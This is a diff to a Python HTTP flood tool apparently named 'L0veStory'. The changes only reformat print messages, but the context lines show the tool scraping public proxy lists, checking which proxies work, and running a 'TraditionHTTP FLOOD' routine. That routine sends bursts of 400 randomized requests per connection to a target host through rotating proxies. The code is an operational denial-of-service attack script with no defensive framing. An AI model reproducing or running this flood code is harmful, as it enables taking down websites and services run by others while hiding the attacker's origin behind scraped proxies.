@@ -211,7 +211,7 @@ def launchChecker(): #Starting proxy check
         for proxy in sorted(set(good_proxies)):
             f.write(proxy + "\n")
 
-    print(f"\n✅ Check complete! Success.: {len(good_proxies)}, Fail: {len(proxies)-len(good_proxies)}")
+    print(f"\n✅ Check complete! Success.: {len(good_proxies)}, Fail: {len(proxies) - len(good_proxies)}")
     time.sleep(3)
 
 
@@ -296,7 +296,7 @@ def ProxyScraper(): # Proxy scraping , # Regarding proxy scraping—having done 
     for u in s5URL:
         r = requests.get(u)
         if r.status_code == 200:
-            print(f"\033[38;5;220m[L0veStort]\033[37m=>status: \033[36m{r.status_code}\033[0m \033[30m{u}\033[0m")
+            print(f"\033[38;5;220m[L0veStort]\033[37m->status: \033[36m{r.status_code}\033[0m \033[30m{u}\033[0m")
             lst = r.text.split("\r\n")
             for lines in lst:
                 if len(lines) > 10 and len(lines) < 22:
@@ -319,7 +319,7 @@ def ProxyScraper(): # Proxy scraping , # Regarding proxy scraping—having done 
                     proxy = ip+":"+port
                 download_proxy.append(proxy)
             
-        print(f"\033[38;5;220m[L0veStory]\033[37m=>status: \033[36m{r.status_code}\033[0m \033[30m{u}\033[0m")
+        print(f"\033[38;5;220m[L0veStory]\033[37m->status: \033[36m{r.status_code}\033[0m \033[30m{u}\033[0m")
 
     print("Start Fetch From FreeProxyUpdate")
     fpu = ["https://freeproxyupdate.com/files/txt/http.txt",
@@ -353,7 +353,7 @@ def ProxyScraper(): # Proxy scraping , # Regarding proxy scraping—having done 
     for u in fpu:
         r = requests.get(u)
         if r.status_code == 200:
-            print(f"\033[38;5;220m[L0veStory]\033[37m]=>status: \033[36m{r.status_code}\033[0m \033[30m{u}\033[0m")
+            print(f"\033[38;5;220m[L0veStory]\033[37m]->status: \033[36m{r.status_code}\033[0m \033[30m{u}\033[0m")
             lst = r.text.split('\n')
             for lines in lst:
                 if len(lines) > 10 and len(lines) < 22:
@@ -379,7 +379,7 @@ def ProxyScraper(): # Proxy scraping , # Regarding proxy scraping—having done 
     print("fetch proxies from Proxifly")
     r = requests.get(proxifly)
     if r.status_code == 200:
-        print(f"\033[38;5;220m[L0veStory]\033[37m=>status: \033[36m{r.status_code}\033[0m \033[30mProxifly\033[0m")
+        print(f"\033[38;5;220m[L0veStory]\033[37m->status: \033[36m{r.status_code}\033[0m \033[30mProxifly\033[0m")
         lst = r.text.split('\n')
         for lines in lst:
             if len(lines) > 10 and len(lines) < 22:
@@ -388,7 +388,7 @@ def ProxyScraper(): # Proxy scraping , # Regarding proxy scraping—having done 
     ip89cn = "https://api.89ip.cn/tqdl.html?api=1&num=9999&port=&address=&isp="
     r = requests.get(ip89cn)
     if r.status_code == 200:
-        print(f"\033[38;5;220m[L0veStory]\033[37m=>status: \033[36m{r.status_code}\033[0m \033[30m89ip.cn\033[0m")
+        print(f"\033[38;5;220m[L0veStory]\033[37m->status: \033[36m{r.status_code}\033[0m \033[30m89ip.cn\033[0m")
         lst = r.text.split('\n')
         for lines in lst:
             if len(lines) > 10 and len(lines) < 22:
@@ -399,7 +399,7 @@ def ProxyScraper(): # Proxy scraping , # Regarding proxy scraping—having done 
         host = u.split(".com/")[1]
         r = requests.get(u)
         if r.status_code == 200:
-            print(f"\033[38;5;220m[L0veStory]\033[37m=>status: \033[36m{r.status_code}\033[0m \033[30m{host}\033[0m")
+            print(f"\033[38;5;220m[L0veStory]\033[37m->status: \033[36m{r.status_code}\033[0m \033[30m{host}\033[0m")
             lst = r.text.split("\n")
             for lines in lst:
                 if len(lines) > 10 and len(lines) < 22:
@@ -451,9 +451,9 @@ def send_requests(): #TraditionHTTP FLOOD
             try:
                 for _ in range(400):
                     s.send(f"{method} {path}?{rC(string)}={rInt(1,99999)}{rC(rand)} HTTP/1.1\r\nHost: {host}\r\n{header}".encode())
-                print(f"\033[38;5;220m[L0veStory]\033[37m=>Stress \033[36m{host}\033[0m From: \033[35;1m{proxy_ip}:{proxy_port}\033[0m")
+                print(f"\033[38;5;220m[L0veStory]\033[37m->Stress \033[36m{host}\033[0m From: \033[35;1m{proxy_ip}:{proxy_port}\033[0m")
             except:
-                print(f"\033[38;5;220m[L0veStory]\033[37m=>Proxy: \033[35;1m{proxy_ip}:{proxy_port}\033[0m request \033[31;1mFailed\033[0m")
+                print(f"\033[38;5;220m[L0veStory]\033[37m->Proxy: \033[35;1m{proxy_ip}:{proxy_port}\033[0m request \033[31;1mFailed\033[0m")
                 s.close()
                 proxy_ip, proxy_port = random.choice(good_proxies).split(":")
                 proxy_port = int(proxy_port)
